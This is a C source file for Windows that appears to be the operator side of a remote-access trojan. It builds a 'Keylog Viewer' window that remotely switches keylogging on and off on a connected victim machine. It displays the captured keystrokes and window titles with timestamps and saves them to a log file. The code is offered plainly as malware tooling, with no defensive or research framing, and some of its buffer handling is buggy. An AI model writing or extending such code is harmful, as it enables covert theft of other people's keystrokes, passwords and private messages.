#include "Main.h"
#include "PacketHead.h"
#include "Settings.h"
#include "resource.h"


void SetKeyWindow(HWND hwnd)
{
	RECT rc;
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_ONLINE),0,0,rc.right - 5, rc.bottom - 45, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_OFFLINE),0,0,rc.right - 5, rc.bottom -  60, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_MAIN_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESSA),0,rc.bottom - 55,rc.right - 5, 10, TRUE);
}
LRESULT CALLBACK KeyLogProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
//	HWND hEdit;
//	int  ndx;                                   //  Current text color
//    HANDLE hRichEdit;
//	POINT  pt;   // location of mouse click 
//    HMENU hmenu;
//	HMENU hmenuTrackPopup;
	LPSTR pszFileText;
   CHOOSECOLOR cc;
   CHARFORMAT cf;
   DWORD dwColors[ 16 ];
   HANDLE FileHandle;
   DWORD numb_bytes;
   DWORD dwFileSize;
   RECT rc;
   TCITEM tie;
   char WindowOut [12] = "";
   char FileNameA[30] = "Logs";
   int I = 0;
   HICON hIcon;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 16, 16, 0);
		SendMessage(hwnd, WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
		DeleteObject(hIcon);
		hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 64, 64, 0);
		SendMessage(hwnd, WM_SETICON,ICON_BIG,(LPARAM)hIcon);
	SendDlgItemMessage( hwnd, IDC_KEYS, EM_SETBKGNDCOLOR, FALSE, dwBackColor );


	CreateWindowEx(0, STATUSCLASSNAME, NULL,WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0,hwnd, (HMENU)IDC_MAIN_STATUS , GetModuleHandle(NULL), NULL);
	SendMessage(GetDlgItem(hwnd,IDC_MAIN_STATUS), SB_SETTEXT, 0, (LPARAM)"Downloading logs...");	

    tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Online logs";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_KEYS), 0, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "OffLine log's";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_KEYS), 1, &tie);

	ShowWindow(GetDlgItem( hwnd, IDC_OFFLINE ),SW_HIDE);
	ShowWindow(GetDlgItem( hwnd, IDC_PROGRESSA ),SW_HIDE);
		 
		SetKeyWindow(hwnd);
         if(GetDlgItem( hwnd, IDC_ONLINE ))                         //  Sanity Check
         {
            memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure

            cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
            cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
            cf.crTextColor = dwTextColor;
            cf.yHeight = 32;
            strcpy( cf.szFaceName, "MS Sans Serif" );
                              //  Set character formatting and background color
            SendDlgItemMessage( hwnd, IDC_ONLINE, EM_SETCHARFORMAT, 4, (LPARAM)&cf );		
		    SendDlgItemMessage( hwnd, IDC_ONLINE, EM_SETBKGNDCOLOR, FALSE, dwBackColor );
            //SendDlgItemMessage( hwnd, IDC_KEYS, EM_SETBKGNDCOLOR, FALSE, 0 );
         }
	
		 
		GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 256);
	    FBISend(Server[atoi(WindowOut)], "", 0 , 0, 0, PACKET_KEYLOGGER);
         return( TRUE );
/////////////////////////////////////////////////////////////
	break;
    case WM_NOTIFY:
	switch(wParam)
	{

	case IDC_KEYS:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(hwnd, IDC_KEYS)); 
                    if(iPage != 0)
					{
					 GetClientRect(hwnd, &rc);					 
					 ShowWindow(GetDlgItem( hwnd, IDC_ONLINE ),SW_HIDE);
					 ShowWindow(GetDlgItem( hwnd, IDC_OFFLINE ),SW_SHOW);
					 ShowWindow(GetDlgItem( hwnd, IDC_PROGRESSA ),SW_SHOW);
					}
					else
					{
					 GetClientRect(hwnd, &rc);
					 ShowWindow(GetDlgItem( hwnd, IDC_OFFLINE ),SW_HIDE);
					 ShowWindow(GetDlgItem( hwnd, IDC_PROGRESSA ),SW_HIDE);
					 ShowWindow(GetDlgItem( hwnd, IDC_ONLINE ),SW_SHOW);
					}
				
				break;
            }
		break;
	}
	break;
	case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			SetKeyWindow(hwnd);
			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_BOTTOMLEFT:
				SetKeyWindow(hwnd);
				break;
			case WMSZ_BOTTOMRIGHT:
				SetKeyWindow(hwnd);
				
				//MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
				break;
			case WMSZ_LEFT:
				SetKeyWindow(hwnd);
				
				//MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
				break;
			case WMSZ_RIGHT:
				SetKeyWindow(hwnd);
				
				//MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
				break;
			case WMSZ_TOP:
				SetKeyWindow(hwnd);
				//MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
				break;
			case WMSZ_TOPLEFT:
				SetKeyWindow(hwnd);
				// MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
				break;
			case WMSZ_TOPRIGHT:
				SetKeyWindow(hwnd);
				
				//MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
				break;
			}
			break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case  IDC_TEXTNORMAL:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTextColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTextColor = cc.rgbResult;        
		 break;

        case  IDC_TIME:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTimeColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTimeColor = cc.rgbResult;
         
		 break;
		case  IDC_WINDOWTEXT:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTitleColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTitleColor = cc.rgbResult;

		 memset( &cf, 0, sizeof(CHARFORMAT) );
		 cf.cbSize = sizeof(CHARFORMAT);
		 cf.dwMask = CFM_COLOR;
		 cf.crTextColor = dwTextColor;
         
		 break;
		case  IDC_BACKGROUND:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwBackColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		 dwBackColor = cc.rgbResult;

		 SendDlgItemMessage( hwnd, IDC_ONLINE, EM_SETBKGNDCOLOR, FALSE, dwBackColor );
         break;

		case IDCANCEL:
			FBISend(Server[atoi(WindowOut)], "", 0 , 0, 0, PACKET_KEYLOGGER_OFF);
			if(MessageBox(NULL, "Would you like to save Logs?", "Save", MB_YESNO | MB_ICONQUESTION) == IDYES)
			{
			dwFileSize = GetWindowTextLength (GetDlgItem(hwnd, IDC_ONLINE));
			pszFileText = (char *)GlobalAlloc(GPTR, dwFileSize + 1);
			GetWindowText(GetDlgItem(hwnd, IDC_KEYS), pszFileText, dwFileSize);
			
			FileHandle = CreateFile (FileNameA, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			WriteFile(FileHandle, pszFileText, strlen(pszFileText), &numb_bytes, NULL);

					EndDialog(hwnd,Select);
			}
					
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
					KeyHwnd[atoi(WindowOut)] = NULL;
					EndDialog(hwnd,Select);
					
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}
HINSTANCE KeyLogInst;

DWORD WINAPI KeylogWindow(LPVOID lpParam)
{
	int LID = (int)lpParam;
	char WindowText [50] = "";
    char TID [12] = "";
	RECT rc;
	
	KeyHwnd[LID]=CreateDialog(KeyLogInst,(LPCTSTR)IDD_KEYLOG,NULL,(DLGPROC)KeyLogProc);
	ShowWindow(KeyHwnd[LID],SW_SHOW);
	ShowWindow(GetDlgItem(KeyHwnd[LID], IDC_ID),SW_HIDE);
	
	sprintf(WindowText, "Keylog Viewer - %s", Information[LID].Buf3);
	SetWindowText(KeyHwnd[LID], WindowText);
	
	sprintf(TID, "%d", LID);
	SetWindowText(GetDlgItem(KeyHwnd[LID], IDC_ID), TID);
	
	GetClientRect(KeyHwnd[LID], &rc);
	MSG msg;
	InitCommonControls();
	while(GetMessage(&msg,KeyHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}
void SetKeylogger(char * Data, int ID)
{
 	GetTime();
	CHARFORMAT cf;
	HWND hEdit;
	int ndx;
	char Buffer [256] = "";
				strcpy(Buffer, "\r\n[");
				strcat(Buffer, Time);
				Buffer[strlen(Buffer) -1] = '\0';
				strcat(Buffer, "]");
				
				hEdit = GetDlgItem (KeyHwnd[ID], IDC_ONLINE);
				ndx = GetWindowTextLength (hEdit);
				SetFocus (hEdit);
				SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);
				
				memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure
				
				cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
				cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
				cf.crTextColor = dwTimeColor;
				cf.yHeight = 32;
				strcpy( cf.szFaceName, "MS Sans Serif" );
				//  Set character formatting and background color
				SendDlgItemMessage( KeyHwnd[ID], IDC_ONLINE, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf );
				SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Buffer));
				strcpy(Buffer, "[");
				strcat(Buffer, Data);
				strcat(Buffer, "] \r\n  \r\n");
				

				SetFocus (hEdit);
				ndx = GetWindowTextLength (hEdit);
				SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);
				
				memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure
				
				cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
				cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
				cf.crTextColor = dwTitleColor;
				cf.yHeight = 32;
				strcpy( cf.szFaceName, "MS Sans Serif" );
				//  Set character formatting and background color
				SendDlgItemMessage( KeyHwnd[ID], IDC_ONLINE, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf );
				SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Buffer));
}